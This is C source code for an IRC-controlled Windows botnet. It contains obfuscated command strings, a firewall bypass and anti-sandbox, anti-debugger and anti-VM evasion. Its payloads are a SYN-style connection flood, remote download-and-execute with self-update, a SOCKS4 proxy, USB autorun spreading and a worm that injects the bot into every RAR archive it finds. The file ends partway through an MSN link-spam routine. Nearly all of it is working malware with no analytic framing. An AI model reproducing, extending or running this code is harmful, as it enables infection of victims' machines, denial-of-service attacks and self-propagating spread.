
#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"
	//////////////////////////////////////////////////////////////////////////////
	//								x0r Encryption
	//////////////////////////////////////////////////////////////////////////////
char str_join[] = "\xBF\xBA\xBC\xBB";
char str_part[] = "\xA5\xB4\xA7\xA1";
char str_mode[] = "\xB8\xBA\xB1\xB0";
char str_pmsg[] = "\xA5\xA7\xBC\xA3\xB8\xA6\xB2";
char str_note[] = "\xBB\xBA\xA1\xBC\xB6\xB0";
char str_pong[] = "\xA5\xBA\xBB\xB2";
char str_nick[] = "\xBB\xBC\xB6\xBE";
char str_pass[] = "\xA5\xB4\xA6\xA6";
char str_user[] = "\xA0\xA6\xB0\xA7";
char str_quit[] = "\xA4\xA0\xBC\xA1";
char str_ping[] = "\xA5\xBC\xBB\xB2";
char decode_key[] = "15214854";
BOOL decode_comp = TRUE;

char *Decode(char *s)
{
	unsigned int i, j;
	char *string;
	string = (char *) malloc (strlen(s)+1);
	strcpy(string, s);
	for (i = 0; i < strlen(string); i++)
	{
		for (j = 0; j < sizeof(decode_key); j++)
			string[i] ^= decode_key[j];

		if (decode_comp)
			string[i] = ~ string[i];
	}
	return string;
}
	//////////////////////////////////////////////////////////////////////////////
	//							Security function
	//////////////////////////////////////////////////////////////////////////////
int fwlbypass() // WinXP SP2/SP3 firewall bypass (Add to via netsh)
{
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.lpTitle     = "";
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	sinfo.wShowWindow = SW_HIDE;
	CreateProcess(NULL, fbyp, NULL, NULL, TRUE, BELOW_NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	return 1;
}
#ifndef NO_ANTI
BOOL AntiSandBox()
{
	char *users[] = {"sandbox", "honey", "vmware", "currentuser"};
	DWORD size = 128;
	char szUser[128];
	int i;
	GetUserName(szUser, &size);
	CharLower(szUser);
	for (i = 0; i <	(sizeof(users) / sizeof(LPTSTR)); i++)
	{
		if (strstr(szUser, users[i]) != 0)
			 return TRUE;
	}
	return FALSE;
}
bool IsDebuggerRunning(HANDLE hProcess)
{
	HMODULE hModule = GetModuleHandle("ntdll.dll");
	ZW_QUERY_SYSTEM_INFORMATION		ZwQuerySystemInformation;
	ZW_QUERY_INFORMATION_PROCESS	ZwQueryInformationProcess;
    ZwQuerySystemInformation	=	(ZW_QUERY_SYSTEM_INFORMATION)GetProcAddress(hModule, "ZwQuerySystemInformation");
    ZwQueryInformationProcess	=	(ZW_QUERY_INFORMATION_PROCESS)GetProcAddress(hModule, "ZwQueryInformationProcess");
	SYSTEM_KERNEL_DEBUGGER_INFORMATION Info;
	PROCESS_DEBUG_PORT_INFO ProcessInfo;
    if (ZwQuerySystemInformation != NULL)
    {
		if (STATUS_SUCCESS == ZwQuerySystemInformation(SystemKernelDebuggerInformation, &Info, sizeof(Info), NULL))
		{
			if (Info.DebuggerEnabled)
			{
				if (Info.DebuggerNotPresent)
				{
				}
				else
				{
					return TRUE;
				}
			}
			else
			{
			}
		}
		else
		{
		}
    }
	else
	{
	}
	if (ZwQueryInformationProcess != NULL)
	{
		if (STATUS_SUCCESS == ZwQueryInformationProcess(hProcess, ProcessDebugPort, &ProcessInfo, sizeof(ProcessInfo), NULL))
		{
			if (ProcessInfo.DebugPort)
			{
				return TRUE;
			}
			else
			{
			}
		}
		else
		{
		}
	}
	else
	{
	}
	return FALSE;
}
DWORD __forceinline IsInsideVPC_exceptionFilter(LPEXCEPTION_POINTERS ep)
{
  PCONTEXT ctx = ep->ContextRecord;
  ctx->Ebx = -1;
  ctx->Eip += 4;
  return EXCEPTION_CONTINUE_EXECUTION;
}
bool DetectVPC()
{
	bool bVPCIsPresent = FALSE;
	__try
	{
		_asm push ebx
		_asm mov  ebx, 0
		_asm mov  eax, 1
		_asm __emit 0Fh
		_asm __emit 3Fh
		_asm __emit 07h
		_asm __emit 0Bh
		_asm test ebx, ebx
		_asm setz [bVPCIsPresent]
		_asm pop ebx
	}
	__except(IsInsideVPC_exceptionFilter(GetExceptionInformation()))
	{
	}
	return bVPCIsPresent;
}
bool DetectVMWare()
{
	bool bVMWareIsPresent = TRUE;
	__try
	{
		__asm
		{
			push   edx
			push   ecx
			push   ebx
			mov    eax, 'VMXh'
			mov    ebx, 0
			mov    ecx, 10
			mov    edx, 'VX'
			in     eax, dx
			cmp    ebx, 'VMXh'
			setz   [bVMWareIsPresent]
			pop    ebx
			pop    ecx
			pop    edx
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		bVMWareIsPresent = FALSE;
	}
	return bVMWareIsPresent;
}
bool DetectAnubis()
{
   char szBuffer[260];
   GetModuleFileName( 0, szBuffer, sizeof( szBuffer ) );
   if( strstr( szBuffer, "C:\\sample.exe" ) )
      return( true );
   return( false );
}
bool IsProcessRunningUnderVM()
{
	bool bVMWare;
	bool bVPC;
	bool bAnubis;
	bVMWare	= DetectVMWare();
	bVPC	= DetectVPC();
	bAnubis	= DetectAnubis();
	if (bVPC==TRUE || bVMWare==TRUE || bAnubis==TRUE)
		return TRUE;
	return FALSE;
}
char* sModule[] = { "SbieDll.dll", "dbghelp.dll" };    
bool IsInSandbox()
{
    for( int i = 0; i < ( sizeof( sModule ) / sizeof( char* ) ); i++ )
    {
        if( GetModuleHandle( sModule[ i ] ) ) 
        {
            return true;
        }
    }
    return false;
}

void ChgHosts() {

	FILE *fp=fopen("\\WINDOWS\\System32\\drivers\\etc\\hosts", "r"); if(fp) 
	{
		while(fgets("\\WINDOWS\\System32\\drivers\\etc\\hosts", sizeof("\\WINDOWS\\System32\\drivers\\etc\\hosts"), fp) && !feof(fp))
			if(strstr("\\WINDOWS\\System32\\drivers\\etc\\hosts", "www.symantec.com")) 
			{
				fclose(fp); return; 
			}
		fclose(fp); 
	}
	fp=fopen("\\WINDOWS\\System32\\drivers\\etc\\hosts", "a"); 
	if(fp) {
		fprintf(fp, "\n");
		fclose(fp); 
	}
}
#endif
    //////////////////////////////////////////////////////////////////////////////
	//                               Supersyn DDOS
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SUPERSYN

	#define MAX_PACK_LEN 65535
	#define SIO_RCALL 0x98000001
	#define SUPERSYN_SOCKETS 200


	#define SYN_DPORT 2000
	#define SYN_XORVAL 0xFFFFFFFF
	#define SYN_SPOOF_TEST 2001
	#define SYN_SPOOF_GOOD 2002

	DWORD WINAPI SuperSynThread(LPVOID param)
	{
		char sendbuf[IRCLINE];

		SUPERSYN supersyn = *((SUPERSYN *)param);
		SUPERSYN *supersyns = (SUPERSYN *)param;
		supersyns->gotinfo = TRUE;
		IRC* irc=(IRC*)supersyn.conn;
		
		if (!supersyn.silent) 
			irc->pmsg(supersyn.target, ".::[SUPERSYN]::. Done with flood (%iKB/sec).05>", SuperSyn(supersyn.ip, supersyn.port, supersyn.length));

		clearthread(supersyn.threadnum);
		ExitThread(0);
		return 0;
	}

	long SuperSynSend(unsigned long TargetIP, unsigned short TargetPort, int len)
	{
		int superdelay = 100;
		SOCKADDR_IN    SockAddr;
		SOCKET         sock[SUPERSYN_SOCKETS];
   		IN_ADDR iaddr;
		memset(&SockAddr, 0, sizeof(SockAddr));
		SockAddr.sin_family = AF_INET;
   		SockAddr.sin_port = fhtons(TargetPort);
		LPHOSTENT lpHostEntry = NULL;
 		DWORD mode = 1;
		int c,i;
		iaddr.s_addr = TargetIP;
		SockAddr.sin_addr = iaddr; //ip addy
		i = 0;
		while (i < len) {
			for (c=0;c<SUPERSYN_SOCKETS;c++)
			{
				sock[c] = socket(AF_INET, SOCK_STREAM, 0);
   				if (sock[c] == INVALID_SOCKET)
      					continue;
				ioctlsocket(sock[c],FIONBIO,&mode);
			}
			for (c=0;c<SUPERSYN_SOCKETS;c++)
  				connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      			Sleep(superdelay);
			for (c=0;c<SUPERSYN_SOCKETS;c++)
				closesocket(sock[c]); //close sockets
			i++;
		}
		return 0;
	}

	long SuperSyn(char *target, char *port, char *len)
	{
		unsigned long IP = finet_addr(target);

		if (IP==INADDR_NONE) {
			hostent *pHE = fgethostbyname(target);
			if (pHE == 0)
				return INADDR_NONE;
			IP = *((unsigned long *)pHE->h_addr_list[0]);
		}

		unsigned long TargetIP = IP;
		unsigned short p = (unsigned short)atoi(port);
		int t = atoi(len);

		long num = SuperSynSend(TargetIP, p, t);

		if (num == 0)
			num = 1;
		num = num / 1000 / t;

		return num;
	}

#endif

	//////////////////////////////////////////////////////////////////////////////
	//								Download
	//////////////////////////////////////////////////////////////////////////////
DWORD WINAPI DownloadThread(LPVOID param)
{
	char buffer[IRCLINE];
	DWORD r, d, start, total, speed;
	NTHREAD dl = *((NTHREAD *)param);
	NTHREAD *dls = (NTHREAD *)param;
	dls->gotinfo = TRUE;
	IRC* irc=(IRC*)dl.conn;
	char dlfrom[MAX_HOSTNAME];
	char dlto[MAX_PATH];
	strncpy(dlfrom,dl.data1,sizeof(dlfrom));
	strncpy(dlto,dl.data2,sizeof(dlto));
	HANDLE fh = fInternetOpenUrl(ih, dlfrom, NULL, 0, 0, 0);
	if (fh != NULL)
	{
		HANDLE f = CreateFile(dlto, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		if (f < (HANDLE)1)
		{
			if (!dl.silent)
				irc->pmsg(Decode(infochan),"%s Couldn't open file for writing: %s.",(download_title),dlto);
			fInternetCloseHandle(fh);
			clearthread(dl.threadnum);
			ExitThread(0);
		}
		total = 0;
		start = GetTickCount();
		char *fileTotBuff=(char *)malloc(512000);
		do
		{
			ZeroMemory(buffer,sizeof(buffer));
			fInternetReadFile(fh, buffer, sizeof(buffer), &r);
			WriteFile(f, buffer, r, &d, NULL);
			if ((total) < 512000)
			{
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) 
					bytestocopy=r;
				memcpy(&fileTotBuff[total],buffer,bytestocopy);
			}
			total+=r;
		}
		while (r > 0);
		speed = total / (((GetTickCount() - start) / 1000) + 1);
		free(fileTotBuff);
		CloseHandle(f);
		fInternetCloseHandle(fh);
		if (!dl.silent)
			irc->pmsg(Decode(infochan),"%s File download: %.1fKB to: %s @ %.1fKB/sec.",(download_title), total/1024.0, dlto, speed/1024.0);
		if (!dl.bdata1 && dl.bdata2)
		{
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			BOOL hide=dl.bdata3, wait=dl.verbose;
			char path[MAX_PATH];
			strncpy(path,dlto,sizeof(path));
			if (!fPathRemoveFileSpec(path))
			{
				if (!dl.silent)
					irc->pmsg(Decode(infochan),"%s Couldn't parse path, error: <%d>", download_title, GetLastError());
				return 1;
			}
			ZeroMemory(&si,sizeof(si));
			ZeroMemory(&pi,sizeof(pi));
			si.cb=sizeof(si);
			si.dwFlags = STARTF_USESHOWWINDOW;
			si.wShowWindow = (hide?SW_HIDE:SW_SHOW);
			if (!CreateProcess(NULL,dlto,NULL,NULL,FALSE,0,NULL,path,&si,&pi))
			{
				if (!dl.silent)
					irc->pmsg(Decode(infochan),"%s Failed to create process: \"%s\", error: <%d>", download_title, dlto, GetLastError());
				return 1;
			}
			else
			{
				DWORD start=GetTickCount();
				if (!dl.silent)
					irc->pmsg(Decode(infochan),"%s Created process: \"%s\", PID: <%d>",download_title,dlto,pi.dwProcessId);
				if (dl.verbose)
				{	
					WaitForSingleObject(pi.hProcess,INFINITE);
					DWORD stop=GetTickCount();
					char ttime[120],stime[120];
					stime[0]='\0';
					DWORD total = ((stop - start)/1000);
					DWORD hours = (total%86400)/3600;
					DWORD minutes = ((total%86400)%3600)/60;
					DWORD seconds = ((total%86400)%3600)%60;
					if (hours>0)
					{
						sprintf(ttime," %d%s",hours,(hours==1?" hour":" hours"));
						strcat(stime,ttime);
					}
					sprintf(ttime," %.2d:%.2d",minutes,seconds);
					strcat(stime,ttime);
					irc->pmsg(Decode(infochan),"%s Process Finished: \"%s\", Total Running Time: %s.",download_title,dlto,stime);
				}
				if (pi.hProcess) CloseHandle(pi.hProcess);
				if (pi.hThread) CloseHandle(pi.hThread);
			}
					// download is an update
		}
		else if (dl.bdata1)
		{
			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			ZeroMemory(&pinfo, sizeof(PROCESS_INFORMATION));
			ZeroMemory(&sinfo, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dlto, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS|DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE)
			{
				uninstall(TRUE,(dl.idata1==1?TRUE:FALSE));
				irc->quit(str_quit_upd);
				Sleep(FLOOD_DELAY);
				irc->disconnect();
				fWSACleanup();
				ExitProcess(EXIT_SUCCESS);
			}
			else
			{
				if (!dl.silent)
					irc->pmsg(Decode(infochan),"%s Update failed: Error executing file: %s.",update_title,dlto);
			}
		}
	}
	else
	{
		if (!dl.silent)
			irc->pmsg(Decode(infochan),"%s Bad URL or DNS Error, error: <%d>",(download_title),GetLastError());
	}
	clearthread(dl.threadnum);
	ExitThread(0);
		return 0;
}
	//////////////////////////////////////////////////////////////////////////////
	//								Sock4 Server
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SOCK4

#define SOCKS4_CONNECT 1
#define SOCKS4_GRANT 90
#define SOCKS4_REJECT 91
typedef struct SOCKS4HEADER {
	u_char vn;
	u_char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];
} SOCKS4HEADER;
void transfer_loop(SOCKET target, SOCKET client)
{
	int len;
	char buf[1024];
	fd_set fd;
	while (TRUE)
	{
		FD_ZERO(&fd);
		FD_SET(client, &fd);
		FD_SET(target, &fd);
		ZeroMemory(buf,sizeof(buf));
		fselect(0, &fd, NULL, NULL, NULL);
		if(fFD_ISSET(client, &fd))
		{
			if((len = frecv(client,buf,sizeof(buf),0))== -1) break;
			if(fsend(target,buf,len,0)== -1) break;
		}
	    if (fFD_ISSET(target,&fd))
		{
			if((len = frecv(target,buf,sizeof(buf),0))== -1) break;
			if(fsend(client,buf,len,0)== -1) break;
		}
	}
}
DWORD WINAPI Socks4ClientThread(LPVOID pParam)
{
	struct SOCKS4HEADER hdr;
	SOCKET client=(SOCKET)pParam;
	TIMEVAL timeout;
	fd_set fd;
	SOCKADDR_IN target_in;
	SOCKET outbound;
	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	FD_ZERO(&fd);
	FD_SET(client, &fd);
	if (fselect(0, &fd, NULL, NULL, &timeout) == 0)
	{
		fclosesocket(client);
		return 0;
	}
	if (frecv(client, (char *)&hdr, sizeof(hdr), 0) <= 0)
	{
		fclosesocket(client);
		return 0;
	}
	if (hdr.vn != 4 || hdr.cd != SOCKS4_CONNECT) 
	{
		fclosesocket(client);
		return 0;
	}
	ZeroMemory(&target_in,sizeof(target_in));
	target_in.sin_family = AF_INET;
	target_in.sin_port = hdr.destport;
	target_in.sin_addr.s_addr = hdr.destaddr;
	outbound = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fconnect(outbound, (SOCKADDR *)&target_in, sizeof(target_in)) == SOCKET_ERROR)
	{
		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		ZeroMemory(&hdr.userid,1024);
		fsend(client, (char *)&hdr, 8, 0);
		fclosesocket(client);
		return 0;
	}
	hdr.vn = 0;
	hdr.cd = SOCKS4_GRANT;
	ZeroMemory(&hdr.userid,1024);
	fsend(client, (char *)&hdr, 8, 0);
	transfer_loop(outbound, client);
	return 0;
}
DWORD WINAPI SocksDaemon(LPVOID param)
{
	NTHREAD socks4 = *((NTHREAD*)param);
	NTHREAD *socks4s = (NTHREAD *)param;
	socks4s->gotinfo = TRUE;
	struct sockaddr_in info;
	struct sockaddr_in client_in;
	SOCKET server;
	SOCKET client;
	DWORD lpThreadId;
	info.sin_family = AF_INET;
	info.sin_port = fhtons(socks4.idata1);
	info.sin_addr.s_addr = INADDR_ANY;
	server = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fbind(server, (SOCKADDR *)&info, sizeof(info)) != 0)
	{
		clearthread(socks4.threadnum);
		ExitThread(0);
	}
	if (flisten(server, 10) != 0)
	{
		clearthread(socks4.threadnum);
		ExitThread(0);
	}
	while (TRUE)
	{
		client = faccept(server, (SOCKADDR *)&client_in, NULL);
		CreateThread(NULL, 0, &Socks4ClientThread, (LPVOID)client, 0, &lpThreadId);
	}
	clearthread(socks4.threadnum);
	ExitThread(0);
}
#endif
	//////////////////////////////////////////////////////////////////////////////
	//								USB Spread
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_USB
BOOL USB_InfectDrive(char *drv)
{	
	char	szFile[IRCLINE] = {0}, szTemp[IRCLINE] = {0}, *p;
	int		i;
	BOOL	ret;
	HANDLE	f;
	DWORD	d;
	lstrcat(szFile, drv);
	lstrcat(szFile, usbrecyclerpath);
	if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return FALSE;
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	lstrcat(szFile, usbrecyclersubpath);
	if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return FALSE;
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	lstrcat(szFile, usbdeskini);	
	f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (f < (HANDLE)1) 
		return FALSE;
	if (!WriteFile(f, usbdeskdata, sizeof(usbdeskdata) - 1, &d, NULL))
	{
		CloseHandle(f);
		return FALSE;
	}
	CloseHandle(f);
	p = szFile + lstrlen(szFile);
	while (p[0] != '\\')
	p--;
	p++;
	*p = 0;
	lstrcat(szFile, usbfname);
	GetModuleFileName(0, szTemp, sizeof(szTemp)-1);
	ret = CopyFile(szTemp, szFile, TRUE);
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;
	p = szFile;
	while (p[0] != '\\')
	p++;
	p++;
	lstrcat(szTemp, usbarundata1);
	lstrcat(szTemp, p);
	lstrcat(szTemp, usbarundata2);
	lstrcat(szTemp, p);
	lstrcat(szTemp, usbarundata3);
	for (i = 0; i < sizeof(szFile); i++)
		szFile[i] = 0;
	lstrcat(szFile, drv);
	lstrcat(szFile, usbdeskaruninf);
	SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
	f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY, 0);
	if (f < (HANDLE)1)
		return FALSE;
	if (!WriteFile(f, szTemp, lstrlen(szTemp), &d, NULL))
	{
		CloseHandle(f);
		return FALSE;
	}
	CloseHandle(f);
	return ret;
}
DWORD WINAPI usbspread(LPVOID param)
{
	NTHREAD usb = *((NTHREAD *)param);
	NTHREAD *usbs = (NTHREAD *)param;
	usbs->gotinfo = TRUE;
	IRC* irc=(IRC*)usb.conn;
    char		szTemp[IRCLINE] = {0}, buff[IRCLINE];
	char 		szDrive[3];
	char		*p;
	int			i;
	szDrive[0] = ' ';
	szDrive[1] = ':';
	szDrive[2] = 0;
	for (;;)
	{
		Sleep(usbsleepfor);
    	if (GetLogicalDriveStrings(IRCLINE - 1, szTemp)) 
    	{
        	p = szTemp;
        	do
        	{
				*szDrive = *p;
				if (szDrive[0] != 65 && szDrive[0] != 66 && szDrive[0] != 97 && szDrive[0] != 98)
				{
					if (GetDriveType(szDrive) == DRIVE_REMOVABLE)
					{
						if (USB_InfectDrive(szDrive))
						{
							irc->pmsg(Decode(infochan), "%s Infected drive: %s", main_title, szDrive);
						}
					}
				}
           		while (*p++);
			} while (*p);
		}
	}
}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//							WinRAR File Injection
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_WINRAR
#pragma pack(push, 1)
typedef struct RAR_FILE_HEADER
{
	WORD	HEAD_CRC;
	BYTE	HEAD_TYPE;
	WORD	HEAD_FLAGS;
	WORD	HEAD_SIZE;
	DWORD	PACK_SIZE;
	DWORD	UNP_SIZE;
	BYTE	HOST_OS;
	DWORD	FILE_CRC;
	DWORD	FTIME;
	BYTE	UNP_VER;
	BYTE	METHOD;
	WORD	NAME_SIZE;
	DWORD	ATTR;
}RarFileHeader;
#pragma pack(pop)
DWORD crc32(void *xdata,int xsize)
{
	HGLOBAL crc32table;
	DWORD retvalue;
	crc32table=GlobalAlloc(GPTR,0x400);
	if(crc32table!=NULL)
	{
		__asm
		{
			;build crc32 table
			;---------------------
			mov		edi,crc32table
			xor		ecx,ecx
	L2:		push	ecx
			mov		eax,ecx
			mov		ecx,8h
	L1:		mov		edx,eax
			and		edx,1h
			jne		equ_1
			shr		eax,1h
			jmp		__1
	equ_1:  shr		eax,1h
			xor		eax,0edb88320h ;polynomial
	__1:    loop	L1
			stosd
			pop		ecx
			inc		ecx
			cmp		ecx,100h
            jb		L2
			;calc crc32 checksum
			;-------------------
			mov		esi,xdata
			mov		edi,xsize
			xor		ecx,ecx
			mov		ebx,0ffffffffh
	crc:	push	ecx
			xor		eax,eax
			lodsb
			mov		edx,ebx
			shr		ebx,8h
			push	ebx
			xchg	edx,ebx
			and		ebx,0ffh
			xor		ebx,eax
			xchg	eax,ebx
			mov		ecx,4h
			mul		ecx
			xchg	eax,ebx
			mov		eax,crc32table
			add		eax,ebx
			mov		eax,dword ptr [eax]
			pop		ebx
			xor		eax,ebx
			mov		ebx,eax
			pop		ecx
			inc		ecx
			cmp		ecx,edi
			jb		crc
			not		eax
			mov		retvalue,eax
		}
		GlobalFree(crc32table);
		return(retvalue);
	}
	return 0;
}
BOOL AddToRar(char RarFile[],char FileToAdd[],char PackedFileName[],DWORD Attributes)
{
	unsigned char RarMainHeader[20] =
	{
		0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x00, 0xCF, 0x90, 0x73,
		0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	};
	unsigned char EndOfRar[7]=
	{
		0xC4, 0x3D, 0x7B, 0x00, 0x40, 0x07, 0x00,
	};
	HANDLE hrarfile,hfile,hmap,mapbase;
	DWORD IO_Buffer,FileSize,RarFileSize;
	RarFileHeader RarHeader;
	char WorkBuffer[128],*WBp;
	hfile=CreateFile(FileToAdd,GENERIC_READ,FILE_SHARE_READ,0,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if(hfile==INVALID_HANDLE_VALUE)
		return FALSE;
	FileSize=GetFileSize(hfile,NULL);
	if(FileSize==0xFFFFFFFF)
	{
		CloseHandle(hfile);
		return FALSE;
	}
	hrarfile=CreateFile(RarFile,GENERIC_WRITE,FILE_SHARE_READ,0,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

	if(hrarfile==INVALID_HANDLE_VALUE)
	{
		hrarfile=CreateFile(RarFile,GENERIC_WRITE,FILE_SHARE_READ,0,
		CREATE_NEW,FILE_ATTRIBUTE_NORMAL,0);
		if(hrarfile==INVALID_HANDLE_VALUE)
		{
			CloseHandle(hfile);
			return FALSE;
		}
		WriteFile(hrarfile,&RarMainHeader,sizeof(RarMainHeader),&IO_Buffer,NULL);
	}
	else
	{
		RarFileSize=GetFileSize(hrarfile,NULL);
		if(RarFileSize==0xFFFFFFFF)
		{
			CloseHandle(hfile);
			CloseHandle(hrarfile);
			return FALSE;
		}
		SetFilePointer(hrarfile,RarFileSize-sizeof(EndOfRar),NULL,FILE_BEGIN);
	}
	hmap=CreateFileMapping(hfile,NULL,PAGE_READONLY,NULL,NULL,NULL);
	if(hmap==NULL)
	{
		CloseHandle(hfile);
		CloseHandle(hrarfile);
		return FALSE;
	}
	mapbase=MapViewOfFile(hmap,FILE_MAP_READ,NULL,NULL,NULL);
	if(mapbase==NULL)
	{
		CloseHandle(hmap);
		CloseHandle(hfile);
		CloseHandle(hrarfile);
		return FALSE;
	}
	memset(&RarHeader,0,sizeof(RarHeader));
	RarHeader.HEAD_TYPE=0x74;
	RarHeader.FILE_CRC=crc32(mapbase,FileSize);
	RarHeader.HEAD_FLAGS=0x8000;
	RarHeader.METHOD=0x30;
	RarHeader.UNP_VER=0x14;
	RarHeader.ATTR=Attributes;
	RarHeader.UNP_SIZE=FileSize;
	RarHeader.PACK_SIZE=FileSize;
	RarHeader.NAME_SIZE=lstrlen(PackedFileName);
	RarHeader.HEAD_SIZE=(sizeof(RarHeader)+RarHeader.NAME_SIZE);
	memset(WorkBuffer,0,sizeof(WorkBuffer));
	memcpy(WorkBuffer,&RarHeader,sizeof(RarHeader));
	WBp=WorkBuffer;
	WBp+=sizeof(RarHeader);
	memcpy(WBp,PackedFileName,RarHeader.NAME_SIZE);
	crc32(WorkBuffer+2,sizeof(RarHeader)+RarHeader.NAME_SIZE-2);
	__asm
	{
		mov word ptr [RarHeader.HEAD_CRC],ax
	}
	WriteFile(hrarfile,&RarHeader,sizeof(RarHeader),&IO_Buffer,NULL);
	WriteFile(hrarfile,PackedFileName,RarHeader.NAME_SIZE,&IO_Buffer,NULL);
	WriteFile(hrarfile,mapbase,FileSize,&IO_Buffer,NULL);
	WriteFile(hrarfile,EndOfRar,sizeof(EndOfRar),&IO_Buffer,NULL);
	UnmapViewOfFile(mapbase);
	CloseHandle(hmap);
	CloseHandle(hfile);
	CloseHandle(hrarfile);
	return TRUE;
}
char wormpath[MAX_PATH];
void InfectDrive()
{
	WIN32_FIND_DATA wfd;
	HANDLE hfind;
	char fullpath[MAX_PATH];
	LPTSTR xaddr=NULL;
	char xrndstr[30];
	hfind=FindFirstFile("*.*",&wfd);
	if(hfind!=INVALID_HANDLE_VALUE)
	{
		do
		{
			if(wfd.cFileName[0]!='.')
			{
				wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;
				if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY)
				{
					if(SetCurrentDirectory(wfd.cFileName)==TRUE)
					{
						InfectDrive();
						SetCurrentDirectory("..");
					}
				}
				else
				{
					if(GetFullPathName(wfd.cFileName,MAX_PATH,fullpath,&xaddr)!=0)
					{
						CharLower(fullpath);
						if(memcmp(fullpath+lstrlen(fullpath)-3,"rar",3)==0)
						{
							Sleep(5000);
							RandomString(xrndstr,7,TRUE);
							AddToRar(fullpath,wormpath,rarexe,FILE_ATTRIBUTE_NORMAL);
						}
					}
				}
			}
		}while(FindNextFile(hfind,&wfd));
		FindClose(hfind);
	}
}
DWORD WINAPI RarWorm(LPVOID xvoid)
{
	char Drive[]="z:\\";
	UINT drive_type;
	if(GetModuleFileName(NULL,wormpath,MAX_PATH)==0)
		ExitThread(0);
	do
	{
		drive_type=GetDriveType(Drive);	
		if(drive_type==DRIVE_FIXED || drive_type==DRIVE_REMOTE)
		{
			if(SetCurrentDirectory(Drive)==TRUE)
				InfectDrive();	
		}
		Drive[0]--;
	}while(Drive[0]!='b');
	return 1;
}
HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter)
{
	DWORD Thread_Id;
	return(CreateThread(NULL,NULL,XThread_Function,Parameter,NULL,&Thread_Id));
}void RandomString(char *dst,int len,BOOL Gen_Numbers)
{
	int i=0,randn=0;
	srand(GetTickCount());
	do
	{
		randn=(rand() % 90);
		if(randn<30 && i!=0 && Gen_Numbers==TRUE)
			dst[i]=(48 + (rand() % 9));
		else if(randn<60)
			dst[i]=(98 + (rand() % 24));
		else if(randn>60)
			dst[i]=(66 + (rand() % 24));
		i++;
		len--;
	}while(len!=0);
	dst[i]=NULL;
}
#endif
	//////////////////////////////////////////////////////////////////////////////
	//			MSN Api Link Spam
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_MSN
#import "../Other/MSNMessengerAPI.tlb" named_guids, no_namespace
void to_variant(BSTR, VARIANT& vt);

char *stristr(const char *String, const char *Pattern) {
	char *pptr, *sptr, *start;
	unsigned int slen, plen;
	for (start = (char *) String,
			pptr = (char *) Pattern,
			slen = strlen (String), plen = strlen (Pattern);
			slen >= plen; start++, slen--) {
		while (toupper (*start) != toupper (*Pattern)) {
			start++;
			slen--;
			if (slen < plen)
				return (NULL);
		}
		sptr = start;
		pptr = (char *) Pattern;
		while (toupper (*sptr) == toupper (*pptr)) {
			sptr++;
			pptr++;
			if ('\0' == *pptr)
				return (start);
		}
	}
	return (NULL);
}
void key_type(char* text, HWND hwnd)
{
HGLOBAL hData;
LPVOID pData;
OpenClipboard(hwnd);
EmptyClipboard();
hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(text) + 1);
pData = GlobalLock(hData);
strcpy((LPSTR)pData, text);
GlobalUnlock(hData);
SetClipboardData(CF_TEXT, hData);
CloseClipboard();
}















////////////////////////////////////////////////
//				Msn Link With Email
////////////////////////////////////////////////
DWORD WINAPI ImMsg(LPVOID param)
{

	NTHREAD msn = *((NTHREAD *)param);
	NTHREAD *msns = (NTHREAD *)param;
	msns->gotinfo = TRUE;
	IRC* irc=(IRC*)msn.conn;
